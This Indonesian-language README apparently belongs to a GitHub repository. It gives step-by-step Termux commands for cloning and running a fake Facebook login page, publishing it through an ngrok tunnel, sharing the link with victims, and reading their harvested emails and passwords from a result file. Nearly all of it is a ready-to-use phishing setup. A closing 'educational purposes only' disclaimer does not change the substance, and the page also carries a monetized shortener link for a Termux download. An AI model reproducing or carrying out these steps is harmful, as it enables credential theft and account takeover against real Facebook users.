## Membuat Phishing Facebook Sederhana Menggunakan Termux di Android

   ```bash
   pkg update && pkg upgrade
   pkg install git
   git clone https://github.com/sandhemongss/simple-fb-phising.git
   cd simple-fb-phising
   pkg install nodejs
   npm start
   
   ./ngrok http 5000
   ```
   
## Langkah-langkah lengkap

__Install Termux__ :
Download dan install Termux di Playstore atau F-droid.

Jika ingin menggunakan Termux seperti yang saya gunakan [Download Disini.](https://moneyblink.com/xplljU7Mx7)

Buka Termux dan update package `pkg update && pkg upgrade`.

__Install Paket yang Dibutuhkan:__

```bash
pkg install nodejs
```
```bash
pkg install git
```

__Selanjutnya ikuti langkah-langkah berikut :__
```bash
git clone https://github.com/sandhemongss/simple-fb-phising.git
```
```bash
cd simple-fb-phising
```
```bash
npm start
```

Lalu buka Browser/Chrome dan ketik URL `http://localhost:5000` jika semua langkah di atas benar seharusnya halaman login palsu Facebook sudah muncul di server lokal kita. Selanjutnya tinggal bagaimana server lokal kita bisa di akses secara online oleh orang lain, disini saya contohkan menggunakan Ngrok.

__Install Ngrok :__
- Kembali ke Termux lagi dan buka Sesi baru di Termux.

```bash
pkg update && pkg upgrade
```
```bash
pkg install wget
```
```bash 
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip
```

```bash
unzip ngrok-stable-linux-arm.zip
```

__Autentikasi Ngrok:__
- Setelah Ngrok terinstall, kamu perlu menghubungkan akun Ngrok kamu dengan menjalankan token autentikasi `./ngrok authtoken <YOUR_AUTH_TOKEN>`. Kamu bisa mendapatkan token dari [dashboard Ngrok](https://ngrok.com/) setelah mendaftar.

- Jika ada masalah saat menjalankan Ngrok, coba install Ngrok di direktori root Termux. Jalankan perintah `cd` lalu install ulang Ngrok.

- Saya anggap Ngrok sudah berhasil di install, jika sudah buka Termux lagi dan jalankan perintah `./ngrok http 5000`. Ngrok akan menampilkan URL publik yang bisa diakses secara online, misalnya `https://6ehhdj3773u3ujrn.ngrok.io` Salin URL ini lalu share ENJOYY.

- Jika ada yang login melalui link yang kamu bagikan, Email dan Password akan muncul di dalam file `result.txt` yang berada di dalam folder chace.

__Melihat hasil login yang Terekam:__
- Untuk melihat hasil login (email dan password) pastikan kamu berada di dalam direktori `simple-fb-phising`.
```bash 
cd
```
```bash
cd simple-fb-phising
```
```bash
pkg install vim
```
```bash
vim chace/result.txt
```
`:q!` Keluar dari program Vim.


## WARNING
***This tool is only for educational purposes. Unauthorized use of this tool for malicious intent or illegal activities is prohibited. We do not take responsibility for any misuse.***
